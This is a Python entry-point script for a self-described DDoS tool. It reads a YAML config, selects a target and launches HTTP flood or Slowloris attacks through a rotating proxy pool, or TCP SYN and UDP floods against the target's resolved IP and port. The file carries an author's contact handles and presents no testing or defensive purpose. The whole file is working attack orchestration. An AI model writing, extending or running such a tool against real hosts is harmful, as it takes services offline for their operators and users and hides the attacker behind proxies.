"""
DDOS-TOOL

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import argparse
import asyncio
import socket
import sys
from urllib.parse import urlparse

import yaml

from .proxy_pool import ProxyPool
from .utils.logger import get_logger
from .vectors.http_flood import HTTPFlood
from .vectors.slowloris import Slowloris
from .vectors.tcp_syn import TCPSyn
from .vectors.udp_flood import UDPFlood


IS_WINDOWS = sys.platform.startswith("win")


def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


def resolve_target(cfg: dict, name: str | None) -> dict:
    targets = cfg["targets"]
    if name is None:
        return targets[0]
    for t in targets:
        if t["name"] == name:
            return t
    raise SystemExit(f"target not found: {name}")


def resolve_host(host: str, logger):
    try:
        return socket.gethostbyname(host)
    except socket.gaierror as e:
        logger.error(f"DNS resolution failed for {host}: {e}")
        return None


async def run_l7(cfg: dict, target: dict, logger):
    pool = ProxyPool(
        proxy_file=cfg["proxy"]["file"],
        health_check_url=cfg["proxy"]["health_check_url"],
        max_failures=cfg["proxy"]["max_failures_before_drop"],
        rotate=cfg["proxy"]["rotate"],
        health_check_concurrency=cfg["proxy"]["health_check_concurrency"],
    )
    n = pool.load()
    logger.info(f"loaded {n} proxies")
    await pool.health_check()
    logger.info(f"proxy stats: {pool.stats()}")

    vector = cfg["attack"]["vector"]
    if vector == "http_flood":
        engine = HTTPFlood(cfg, pool, logger)
    elif vector == "slowloris":
        engine = Slowloris(cfg, pool, logger)
    else:
        raise SystemExit(f"unknown L7 vector: {vector}")

    result = await engine.run(target)
    logger.info(f"result: {result}")


def run_l4(cfg: dict, target: dict, logger):
    parsed = urlparse(target["url"])
    host = parsed.hostname
    if not host:
        logger.error(f"could not parse hostname from {target['url']}")
        return
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    dst_ip = resolve_host(host, logger)
    if not dst_ip:
        return

    duration = cfg["attack"]["duration_sec"]
    vector = cfg["attack"]["vector"]

    if vector == "tcp_syn":
        engine = TCPSyn(cfg, logger)
        result = engine.run(dst_ip, port, duration)
    elif vector == "udp_flood":
        engine = UDPFlood(cfg, logger)
        result = engine.run(dst_ip, port, duration)
    else:
        raise SystemExit(f"unknown L4 vector: {vector}")

    logger.info(f"result: {result}")


def main():
    if IS_WINDOWS:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    ap = argparse.ArgumentParser()
    ap.add_argument("--config", required=True)
    ap.add_argument("--target", default=None)
    args = ap.parse_args()

    cfg = load_config(args.config)
    target = resolve_target(cfg, args.target)
    logger = get_logger(cfg)

    vector = cfg["attack"]["vector"]
    logger.info(f"platform={sys.platform} target={target['name']} vector={vector}")

    if vector in ("http_flood", "slowloris"):
        asyncio.run(run_l7(cfg, target, logger))
    elif vector in ("tcp_syn", "udp_flood"):
        run_l4(cfg, target, logger)
    else:
        raise SystemExit(f"unknown vector: {vector}")


if __name__ == "__main__":
    main()
